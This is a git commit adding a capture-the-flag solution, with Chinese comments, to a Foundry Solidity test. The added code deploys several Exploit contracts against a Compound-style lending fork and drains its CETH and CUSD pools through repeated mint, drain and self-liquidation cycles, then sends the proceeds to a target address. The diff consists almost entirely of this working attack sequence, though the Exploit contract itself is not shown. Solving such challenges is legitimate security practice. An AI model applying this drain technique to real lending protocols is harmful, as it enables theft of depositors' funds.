2cf7c5cd41e3b95da12dc7e34f8ff3f71c20963a
Edward <edward821220@gmail.com>
2023-12-20 15:02:30 +0800

    Add solution and comments.

--- test/Solve.t.sol
+++ test/Solve.t.sol
@@ -47,6 +47,61 @@ contract Solve is Test {
 
     function testSolve() public {
         /* Solve here */
+        Exploit drainCETH1 = new Exploit(address(CCETH), address(CETH), address(chall), 3500 ether);
+
+        // 一開始有 1e22 的 CWETH 轉到 Exploit 讓他可以 mint CToken
+        CWETH.transfer(address(drainCETH1), CWETH.balanceOf(address(this)));
+
+        // 執行 Exploit 的 drain function 後，會把 CWETH 轉回來，同時可以被清算
+        drainCETH1.drain();
+
+        // 開始清算
+        CETH.approve(address(CCETH), type(uint256).max);
+
+        CCETH.liquidateBorrow(address(drainCETH1), 1, CTokenInterface(CCWETH));
+
+        CCWETH.redeem(1);
+
+        // 重複步驟把 CETH 借光
+        Exploit drainCETH2 = new Exploit(address(CCETH), address(CETH), address(chall), 3500 ether);
+
+        CWETH.transfer(address(drainCETH2), CWETH.balanceOf(address(this)));
+
+        drainCETH2.drain();
+
+        CCETH.liquidateBorrow(address(drainCETH2), 1, CTokenInterface(CCWETH));
+
+        CCWETH.redeem(1);
+
+        Exploit drainCETH3 = new Exploit(address(CCETH), address(CETH), address(chall), 3000 ether);
+
+        CWETH.transfer(address(drainCETH3), CWETH.balanceOf(address(this)));
+
+        drainCETH3.drain();
+
+        CCETH.liquidateBorrow(address(drainCETH3), 1, CTokenInterface(CCWETH));
+
+        CCWETH.redeem(1);
+
+        // 用一樣方法把 CUSD 借光
+        Exploit drainCUSD = new Exploit(address(CCUSD), address(CUSD), address(chall), 10000 ether);
+
+        CWETH.transfer(address(drainCUSD), CWETH.balanceOf(address(this)));
+
+        drainCUSD.drain();
+
+        CUSD.approve(address(CCUSD), type(uint256).max);
+
+        CCUSD.liquidateBorrow(address(drainCUSD), 200, CTokenInterface(CCWETH));
+
+        CCWETH.redeem(1);
+
+        // 最後把賺來的錢和一開始的 CWETH 都轉到 target 地址
+        CUSD.transfer(target, CUSD.balanceOf(address(this)));
+
+        CETH.transfer(target, CETH.balanceOf(address(this)));
+
+        CWETH.transfer(target, CWETH.balanceOf(address(this)));
 
         assertEq(chall.isSolved(), true);
     }
